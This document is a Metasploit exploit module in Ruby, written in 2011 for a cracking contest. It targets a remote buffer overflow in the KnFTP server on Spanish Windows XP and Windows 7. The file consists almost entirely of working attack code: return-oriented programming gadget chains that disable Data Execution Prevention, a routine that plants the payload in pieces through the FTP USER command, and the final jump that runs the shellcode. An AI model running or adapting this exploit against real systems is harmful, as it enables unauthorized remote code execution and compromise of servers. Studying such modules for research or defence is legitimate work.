#module for metasploit framework, for more information
#see the Description.
#Copyright (C) October 04th 2011
#Author: Javier Aguinaga (pasta) el.tio.pastafrola[at]gmail.com 
#
#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'KnFTP FTP Server Multiple Commands Remote Buffer Overflow Vulnerabilities',
			'Description'    => %q{
				This module exploits a vulnerability in the KnFTP
				application. The same by-pass DEP with AlwaysOn.
				
				Built for the 10th contest of [C]racks[L]atino[S].
			},
			'Author'         => [ 'pasta' ],
			'License'        => GPL_LICENSE,
			'Version'        => '$Revision: 0 $',
			'References'     =>
				[
					[ 'URL', 'http://www.securityfocus.com/bid/49427'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 0x300,
					'BadChars' => "\x00",
					'DisableNops'	=>  'True'
				},
			'Platform'       => [ 'win' ],
			'Targets'        =>
				[
					[
						'Windows XP SP2/SP3 Spanish (NX)',
						{
							'rop_movs' => [
								0x77bf1d16, # POP EAX
								0x41414141, # PADDING
								0x77c07451, # LEA EAX,[EBP-10]
								0x77bf2751, # EBP = ESP+C && JMP EAX <--
								
								            # se ejecuta la carga de EBP
											# y despues carga en EAX el valor
											# EBP-10, esto es x el JMP EAX
											
								0x77bef2c1, # ADD EAX,8
								0x77bef2c1, # ADD EAX,8
								0x77bef2c1, # ADD EAX,8
								0x77bef2c1, # ADD EAX,8
								0x77be95ab, # XCHG EAX,ESI # CMPS <-- ROBA
								0x77c0620b, # MUEVE 6 DWORDS DE ESI A EDI
								0x41414141, # JUNK
								0x41414141, # JUNK
								0x77bf22b6  # JMP $
								],
							
							'rop_popeax_null' => [
								0x77bef519, # POP ECX
								0x41414141, # PADDING
								0x42424242, # JUNK
								0x77bf1d16, # POP EAX
								0x42424242, # JUNK
								0x77c0f284  # LEA EAX,[EAX+ECX*8]
								],
							
							'rop_popeax' => [
								0x77bf1d16, # POP EAX
								0x41414141, # PADDING
								0x42424242  # JUNK
								],
								
							'rop_writemem' => [
								0x77bef519, # POP ECX
								0x42424242, # JUNK
								0x77c12f02, # MOV [ECX],EAX
								0x42424242, # JUNK
								0x77bf22b6  # JMP $
								],
								
							'rop_jmpeax' => [
								0x77be68cd, # JMP EAX
								],
								
							'rop_changeeip' => [
								0x77bf1d16, # POP EAX
								0x41414141, # PADDING
								0x41414141, # JUNK
								0x77be68cd  # JMP EAX
								],
								
							'place4payload' => 0x77e1ac81, # .data msvcrt	
							'place4argumen' => 0x77e1ab40, # .data msvcrt
							
							'loop' => 0x77bf22b6, # JMP $
						}
					],
					
					[
						'Windows 7 Professional SP1 Spanish (NX)',
						{
							'rop_movs' => [
								0x770c181f,
								0x41414141,
								0x77099871,
								0x770abffd,
								0x7709a5c5,
								0x7709a5c5,
								0x7709a5c5,
								0x7709a5c5,
								0x770ce0ab,
								0x770c07d2,
								0x41414141,
								0x41414141,
								0x770aac5b
								],
							
							'rop_popeax_null' => [
								0x7709a984,
								0x41414141,
								0x42424242,
								0x770c181f,
								0x42424242,
								0x770c040f
								],
							
							'rop_popeax' => [
								0x770c181f,
								0x41414141,
								0x42424242
								],
								
							'rop_writemem' => [
								0x7709a984,
								0x42424242,
								0x770a3bdb,
								0x42424242,
								0x770aac5b
								],
								
							'rop_jmpeax' => [
								0x7709c441,
								],
								
							'rop_changeeip' => [
								0x770c181f,
								0x41414141,
								0x41414141,
								0x7709c441
								],
								
							'place4payload' => 0x77136C01,
							'place4argumen' => 0x77136a80,
							
							'loop' => 0x77bf22b6,
						}
					],
				],
			'DisclosureDate' => 'Sept 19 2011',
			'DefaultTarget' => 0))
			
			register_options(
				[
					OptInt.new('TIME', [ true, 'Delay between packets. (seconds)', 5 ]),
				], self.class)
	end

	def exploit
		connect
		print_status("Sending eggs")
		
		address = target['place4payload'] + 0x300
		payload.encoded << 'A'*(16 - payload.encoded.length % 16)
		
		(payload.encoded.length/16).times {|i|
			i += 1
			
			buf  = 'A'*276
			buf << [address - 16 * i].pack('<L')
			buf << 'A'*4
			
			buf << target['rop_movs'].pack('V*') + '1' # <-- byte corrido por CMPS
			
			buf << payload.encoded[payload.encoded.length - 16 * i, 16]
			sleep(datastore['TIME'])
			print "="*i + " "*((payload.encoded.length/16)-i) + "> #{i}/#{payload.encoded.length/16} egg[s]\r"
			send_user(buf)
			disconnect
			
			connect
		}

		memory = target['place4argumen']
		keys = {
			memory+0x04 => target['loop'],
			memory-0x38 => target['place4payload'],
			memory-0x2c => 0x300,
			memory-0x1c => 0x40
		}
		
		print_status("Disabling [D]ata [E]xecution [P]revention")
		
		j = 1
		keys.each {|direction, dword|
			
			buf = 'A'*284
				
			if [dword].pack('<L').index(0.chr)
				ecx = 0x01111111
				eax = 2**32 + dword - ecx*8
				
				target['rop_popeax_null'][2] = ecx
				target['rop_popeax_null'][4] = eax
				buf << target['rop_popeax_null'].pack('V*')
			else
				target['rop_popeax'][2] = dword
				buf << target['rop_popeax'].pack('V*')
			end
			
			target['rop_writemem'][1] = direction
			buf << target['rop_writemem'].pack('V*')
				
			sleep(datastore['TIME'])
			
			print "="*j + " "*(5-j) + "> #{j}/5 egg[s]\r"
			j += 1
			
			send_user(buf)
			disconnect
				
			#connect again
			connect
		}
		
		buf = 'A'*280
		buf << [memory].pack('<L')
		
		load_arguments = 0x00403822
		ecx = 0x01111111
		eax = 2**32 + load_arguments - ecx * 8
		
		target['rop_popeax_null'][2] = ecx
		target['rop_popeax_null'][4] = eax
		
		buf << (target['rop_popeax_null'] + target['rop_jmpeax'] + [0x41414141]).pack('V*')
		
		sleep(datastore['TIME'])
		print "=====> 5/5\r"
		send_user(buf)
		
		print_good("PAYLOAD INJECT SUCCESSFULL")
		disconnect
		
		connect
		
		buf = 'A'*284
		target['rop_changeeip'][2] = target['place4payload'] + 0x300 - payload.encoded.length + 7
		
		buf << target['rop_changeeip'].pack('V*')
		
		print_status("Executing shellcode...")
		send_user(buf)
		sleep(datastore['TIME']*4)
		
		handler
		disconnect
	end

end